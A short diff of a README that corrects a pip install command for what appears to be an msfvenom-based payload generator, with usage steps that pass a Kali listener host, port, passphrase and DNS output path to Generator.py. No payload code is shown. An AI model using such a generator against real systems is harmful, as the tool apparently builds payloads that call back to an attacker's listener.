@@ -240,7 +240,7 @@ for line in strshell.splitlines():
 
 - Navigate into the path into ```RArAtikTdkA/msfVenom/Generator.py```
 - First, install the required libraries by running
-   - ```pip install -r requeriments.txt```
+   - ```python -m pip install -r requirements.txt ```
 - Run ```ip``` a on the Kali Linux box to find it’s IP address.
 - Run
     - ```Generator.py --lhost <kali linux IP> --lport <kali linux PORT> --passphrase <PASSWORD> --filepath <DNS OUTPUTPATH>```
